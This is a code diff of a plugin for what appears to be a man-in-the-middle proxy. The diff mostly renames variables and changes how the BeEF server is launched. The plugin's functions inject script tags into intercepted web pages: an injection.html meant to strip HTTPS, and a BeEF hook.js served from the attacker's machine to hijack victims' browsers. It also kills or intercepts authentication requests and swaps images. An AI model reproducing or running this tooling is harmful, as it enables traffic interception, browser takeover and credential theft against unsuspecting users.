@@ -4,7 +4,7 @@
 
     Usage:
         from plugins import otherplugins
-        otherplugins.init(args, BEEFPORT, FILESERVER, FILEPORT)
+        otherplugins.init(args, BEEFPORT, IP, FILEPORT)
 
     The init function is needed to pass args and then test args["--option"]
 """
@@ -12,9 +12,9 @@
 import logging as log
 import sys
 import os
-from subprocess import call
+from subprocess import Popen
 from mim.bash import ifconfig
-import fileserver
+from mim import fileserver
 from twisted.internet import reactor
 
 # used by actions
@@ -32,30 +32,31 @@ from mim.proxyclient import events as c_events
 killed = set()
 
 BEEFPORT = 3000
-FILESERVER = None
+FILEPORT = 8000
+# use current machine as server
+IP = None
 ifaces = ifconfig().ifaces
 for iface in ifaces:
     if iface.name.startswith("wlan") or iface.name.startswith("eth"):
-        FILESERVER = iface.ip
-if not FILESERVER:
+        IP = iface.ip
+if not IP:
     log.error("No WLAN FOUND")
     sys.exit()
-FILEPORT = 8000
 
 def init(args):
+    # hook events
     if args["--kill"]:
         s_events.gotRequest += kill
     if args["--auth"]:
         s_events.gotRequest += auth
+        
     if args["--inject"]:
         c_events.gotResponseTree += inject
     if args["--beef"]:
         c_events.gotResponseTree += beef
-        os.chdir("/usr/share/beef-xss")
-        call(['sudo', './beef'])
-        log.info("starting beef server on %s" %BEEFPORT)
     if args["--cats"]:
         c_events.gotResponseTree += cats
+        
     if args["--upsidedown"]:
        c_events.gotResponseImage += upsidedown
        
@@ -64,8 +65,11 @@ def init(args):
         datafolder = os.path.join(os.path.dirname(__file__), "data")
         reactor.listenTCP(FILEPORT, fileserver.Site( \
                 fileserver.Data(datafolder)))
-        log.info("starting file server on %s:%s" %(FILESERVER, FILEPORT))
-
+        log.info("starting file server on %s:%s" %(IP, FILEPORT))
+    
+    if args["--beef"]:
+        Popen(["gnome-terminal", "-e", "./startbeef"])
+        log.info("starting beef server on %s" %BEEFPORT)
 
 ########################### gotRequest ########################################################################
 
@@ -141,7 +145,7 @@ def auth(sender):
 
 def inject(sender, tree):
     """ include jquery to remove https e.g. ebay changes loaded back to https after loading """
-    injection = '<script src=http://%s:%s/injection.html></script>'%(FILESERVER, FILEPORT)
+    injection = '<script src=http://%s:%s/injection.html></script>'%(IP, FILEPORT)
     head = tree.xpath("//head")[0]
     elem = lxml.etree.fromstring(injection)
     head.insert(0, elem)
@@ -149,7 +153,7 @@ def inject(sender, tree):
 
 def beef(sender, tree):
     """ inject a beef hook for the browser exploitation framework """
-    injection = '<script src=http://%s:%s/hook.js></script>'%(FILESERVER, BEEFPORT)
+    injection = '<script src=http://%s:%s/hook.js></script>'%(IP, BEEFPORT)
     head = tree.xpath("//head")[0]
     elem = lxml.etree.fromstring(injection)
     head.insert(0, elem)
@@ -158,7 +162,7 @@ def cats(sender, tree):
     """ replace image links with link to image on server
     NOTE: does not replace other links e.g. <a> """
     for item in tree.xpath("//img"):
-        item.attrib["src"] = "http://%s:%s/cats.jpg"%(FILESERVER, FILEPORT)
+        item.attrib["src"] = "http://%s:%s/cats.jpg"%(IP, FILEPORT)
 
 #################### gotResponseImage ###############################################################################
 
